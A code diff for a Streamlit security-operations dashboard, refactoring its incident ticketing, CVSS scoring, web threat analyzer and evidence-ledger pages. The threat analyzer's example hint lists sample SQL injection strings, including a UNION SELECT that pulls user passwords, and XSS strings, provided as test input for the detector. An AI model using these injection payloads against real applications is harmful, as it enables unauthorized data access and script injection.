         desc = st.text_area("Event Description / Findings:", placeholder="Describe the intrusion vector and impacted systems...")
-        
+
         if st.button("Initialize Response Ticket & Execute SOAR Playbook"):
             if target and desc:
                 with st.spinner("Generating incident ticket & dispatching SOAR playbooks..."):
                     res = self.incident_engine.create_incident_ticket(target, severity, desc)
                     ticket_info = res.get("ticket", {})
-                    
+
                     st.success("🎯 Incident Ticket Generated & SOAR Playbooks Initialized!")
-                    
+
                     c1, c2, c3 = st.columns(3)
                     c1.metric("Generated Ticket ID", ticket_info.get("ticket_id", "INC-2026-001"))
                     c2.metric("Incident Severity", severity)
                     c3.metric("Response SLA Target", ticket_info.get("sla_target", "1 Hour"))
-                    
+
                     st.markdown("---")
                     st.markdown("### 🤖 Automated SOAR Playbook Execution Matrix")
-                    
+
                     soar_steps = [
                         {"Phase": "1. Host Containment", "Action": f"Trigger micro-segmentation API to isolate asset '{target}'", "Status": "Completed", "Execution Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
                         {"Phase": "2. Network Perimeter Defense", "Action": "Pushed dynamic DROP rule to edge firewall for malicious C2 IOCs", "Status": "Rule Enforced", "Execution Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
@@ -652,15 +793,13 @@ class SOCDashboardUI:
             else:
                 st.warning("Please specify a target asset and description.")
 
+    # ------------------------------------------------------------
+    # VULNERABILITY MANAGEMENT
+    # ------------------------------------------------------------
     def run_vulnerability_management(self):
-        st.title("📊 Vulnerability & CVSS Assessment")
-        st.markdown("Calculate Common Vulnerability Scoring System (CVSS v3.1) metrics and remediation SLAs.")
-        
-        st.markdown(
-            "> **💡 Testing Example:**\n"
-            "> * **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **Base Score Slider:** `9.8`"
-        )
-        
+        self._page_header("📊", "Vulnerability & CVSS Assessment", "Calculate Common Vulnerability Scoring System (CVSS v3.1) metrics and remediation SLAs.")
+        self._example_hint("**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **Base Score Slider:** `9.8`")
+
         vector_input = st.text_input("Paste CVSS v3.1 Vector String (Optional):", placeholder="e.g., CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", value="")
         score = st.slider("Select CVSS Base Score:", 0.0, 10.0, 7.5, 0.1)
         if st.button("Calculate Vector Risk"):
@@ -673,48 +812,45 @@ class SOCDashboardUI:
             c3.metric("Remediation SLA", assessment.get("sla", "7-14 Days"))
             st.code(assessment.get("vector_string", "CVSS:3.1/..."), language="text")
 
+    # ------------------------------------------------------------
+    # WEB APPLICATION THREAT ANALYZER
+    # ------------------------------------------------------------
     def run_threat_analyzer(self):
-        st.title("🔬 Web Application Threat Analyzer")
-        st.markdown("Inspect URL query parameters and payload strings for SQLi and XSS attack signatures.")
-        
-        st.markdown(
-            "> **💡 Testing Examples (Copy & Paste below):**\n"
-            "> * **SQLi:** `?id=1' OR '1'='1` or `admin' UNION SELECT null, username, password FROM users--`\n"
-            "> * **XSS:** `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`"
+        self._page_header("🔬", "Web Application Threat Analyzer", "Inspect URL query parameters and payload strings for SQLi and XSS attack signatures.")
+        self._example_hint(
+            "**SQLi:** `?id=1' OR '1'='1` or `admin' UNION SELECT null, username, password FROM users--`  \n"
+            "**XSS:** `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`"
         )
-        
+
         payload = st.text_input("Input Parameter String:", placeholder="Paste query parameter or attack payload here...", value="")
         if st.button("Scan Parameter"):
             if payload:
                 with st.spinner("Analyzing web parameter against OWASP attack vectors..."):
                     res = self.analyzer.analyze_web_payload(payload)
                     st.success("Web Application Threat Inspection Complete!")
-                    
+
                     c1, c2, c3 = st.columns(3)
                     c1.metric("Overall Threat Posture", res.get("overall_threat", "MALICIOUS"))
                     c2.metric("Heuristic Risk Score", f"{res.get('risk_score', 0)} / 100")
                     c3.metric("Signatures Triggered", res.get("detections_count", 0))
-                    
+
                     st.markdown("---")
                     st.markdown("### 🛡️ Detailed Detected Attack Vectors & Signatures")
                     detections = res.get("detections", [])
                     if detections:
-                        # Customize matched payload in detection list based on user input
                         for d in detections:
                             d["Matched Payload"] = payload
                         st.dataframe(pd.DataFrame(detections), use_container_width=True, hide_index=True)
             else:
                 st.warning("Please input a parameter string.")
 
+    # ------------------------------------------------------------
+    # LIVE INCIDENT DEFENSE / EVIDENCE LEDGER
+    # ------------------------------------------------------------
     def run_incident_defense(self):
-        st.title("📝 Incident Defense & Evidence Ledger (Full Investigation Suite)")
-        st.markdown("Record threat intelligence notes, track complete investigation timelines, and commit forensic evidence to the immutable local audit trail.")
-        
-        st.markdown(
-            "> **💡 Testing Example:**\n"
-            "> * **Asset:** `192.168.1.100` | **Notes:** `Isolated host following ransomware alert. Cleaned registry keys.`"
-        )
-        
+        self._page_header("📝", "Incident Defense & Evidence Ledger", "Record threat intelligence notes, track investigation timelines, and commit forensic evidence to the local audit trail.")
+        self._example_hint("**Asset:** `192.168.1.100` | **Notes:** `Isolated host following ransomware alert. Cleaned registry keys.`")
+
         col1, col2 = st.columns(2)
         with col1:
             scam_target = st.text_input("Compromised / Malicious Asset:", placeholder="e.g., 192.168.1.100 or malware.exe", value="")
@@ -722,7 +858,7 @@ class SOCDashboardUI:
             investigator = st.text_input("Lead Investigator:", value="M. Hassaan Zahid (Root Analyst)")
 
         evidence_notes = st.text_area("Comprehensive Forensic Investigation Notes & Triage Summary:", placeholder="Enter full investigation details, IoCs discovered, containment steps taken...", height=150)
-        
+
         col_a, col_b = st.columns(2)
         with col_a:
             action_status = st.selectbox("Current Incident Status", ["Contained & Remediation Complete", "Active Triage / Investigation", "Escalated to Tier-3", "False Positive"])
@@ -733,22 +869,22 @@ class SOCDashboardUI:
             if scam_target and evidence_notes:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 full_log_entry = f"[{action_status} | Protocol: {containment_method} | Lead: {investigator}] {evidence_notes}"
-                
+
                 audit_df = pd.DataFrame({
-                    "Timestamp": [timestamp], 
-                    "Target Asset": [scam_target], 
-                    "Investigation Notes": [full_log_entry], 
+                    "Timestamp": [timestamp],
+                    "Target Asset": [scam_target],
+                    "Investigation Notes": [full_log_entry],
                     "Status": [action_status]
                 })
-                
+
                 file_name = "incident_reports.csv"
                 if os.path.exists(file_name):
                     audit_df.to_csv(file_name, mode='a', header=False, index=False)
                 else:
                     audit_df.to_csv(file_name, index=False)
-                    
+
                 st.success("🎯 Evidence & Investigation Summary successfully secured in local immutable SIEM ledger database!")
-                
+
                 st.markdown("### 📋 Complete Live Audit Trail")
                 st.dataframe(pd.read_csv(file_name), use_container_width=True, hide_index=True)
             else:
@@ -761,9 +897,9 @@ class SOCDashboardUI:
 if __name__ == "__main__":
     app = SOCDashboardUI()
     app.setup_page_config()
-    
+
     choice = app.render_sidebar()
-    
+
     if choice == "Overview & Dashboard":
         app.run_overview()
     elif choice == "Global Threat Intel (VirusTotal)":
